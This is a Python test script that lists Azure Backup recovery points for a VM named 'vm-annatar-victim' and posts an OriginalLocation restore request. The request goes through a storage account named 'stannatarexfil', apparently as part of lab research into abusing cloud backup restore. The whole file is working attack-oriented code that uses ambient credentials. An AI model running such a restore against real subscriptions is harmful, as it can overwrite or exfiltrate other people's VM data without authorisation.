#!/usr/bin/env python3
"""Quick standalone test for the Azure Backup OriginalLocation restore."""

import sys
sys.path.insert(0, ".")

from azure.identity import DefaultAzureCredential
from azure.mgmt.compute import ComputeManagementClient
from azure.mgmt.recoveryservicesbackup import RecoveryServicesBackupClient
from azure.mgmt.subscription import SubscriptionClient
import requests

credential = DefaultAzureCredential()
sub_id = list(SubscriptionClient(credential).subscriptions.list())[0].subscription_id

rg = "annatar"
vm_name = "vm-annatar-victim"
vault_name = "rsv-annatar"
fabric = "Azure"
container_name = f"iaasvmcontainer;iaasvmcontainerv2;{rg};{vm_name}"
item_name = f"vm;iaasvmcontainerv2;{rg};{vm_name}"

compute = ComputeManagementClient(credential, sub_id)
backup = RecoveryServicesBackupClient(credential, sub_id)

rps = list(backup.recovery_points.list(vault_name, rg, fabric, container_name, item_name))
vm = compute.virtual_machines.get(rg, vm_name)

print(f"\n--- Recovery points ---")
for rp in rps:
    tiers = getattr(rp.properties, "recovery_point_tier_details", []) or []
    tier_summary = ", ".join(f"{t.type}:{t.status}" for t in tiers)
    print(f"  {rp.name}  {getattr(rp.properties, 'recovery_point_time', '?')}  [{tier_summary}]")

# Use first recovery point that has HardenedRP (Vault-Standard) tier valid
latest = next(
    (rp for rp in rps if any(
        getattr(t, "type", "") == "HardenedRP" and getattr(t, "status", "") == "Valid"
        for t in (getattr(rp.properties, "recovery_point_tier_details", []) or [])
    )),
    rps[0],
)
print(f"\nUsing: {latest.name}")

print(f"\n--- VM ---")
print(f"  id     : {vm.id}")
print(f"  region : {vm.location}")

storage_id = (
    f"/subscriptions/{sub_id}/resourceGroups/{rg}"
    f"/providers/Microsoft.Storage/storageAccounts/stannatarexfil"
)

payload = {
    "properties": {
        "objectType": "IaasVMRestoreRequest",
        "recoveryPointId": latest.name,
        "recoveryType": "OriginalLocation",
        "sourceResourceId": vm.id,
        "storageAccountId": storage_id,
        "region": vm.location,
        "createNewCloudService": False,
        "originalStorageAccountOption": "Never",
        "restoreDiskLunList": [],
    }
}

token = credential.get_token("https://management.azure.com/.default").token
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

# Try different API versions
for api_version in ["2023-04-01", "2023-02-01", "2021-12-01", "2021-01-01"]:
    container_enc = container_name.replace(";", "%3B")
    item_enc = item_name.replace(";", "%3B")
    url = (
        f"https://management.azure.com/subscriptions/{sub_id}/resourceGroups/{rg}"
        f"/providers/Microsoft.RecoveryServices/vaults/{vault_name}"
        f"/backupFabrics/Azure/protectionContainers/{container_enc}"
        f"/protectedItems/{item_enc}/recoveryPoints/{latest.name}/restore"
        f"?api-version={api_version}"
    )
    r = requests.post(url, json=payload, headers=headers)
    print(f"\n--- REST {api_version} → {r.status_code} ---")
    if r.status_code in (200, 202):
        print(f"  SUCCESS: {r.headers.get('Azure-AsyncOperation', r.text[:200])}")
        break
    else:
        print(f"  {r.json().get('error', {}).get('code', '?')}: {r.json().get('error', {}).get('message', '?')[:150]}")
